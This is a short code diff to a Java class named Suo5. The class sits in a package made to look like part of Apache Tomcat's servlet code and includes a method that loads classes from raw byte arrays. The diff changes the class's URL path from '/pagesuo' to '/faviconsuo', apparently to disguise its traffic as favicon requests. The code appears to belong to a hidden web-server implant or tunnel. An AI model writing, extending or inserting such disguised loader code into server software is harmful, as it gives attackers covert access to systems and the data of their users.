@@ -3,7 +3,7 @@ package org.apache.catalina.servlets.sl;
 
 
 public class Suo5 {
-    private static final String pathPattern= "/pagesuo";
+    private static final String pathPattern= "/faviconsuo";
 
     public static Class loader(byte[] bytes) throws Exception {
         java.net.URLClassLoader classLoader = new java.net.URLClassLoader(new java.net.URL[0], Thread.currentThread().getContextClassLoader());
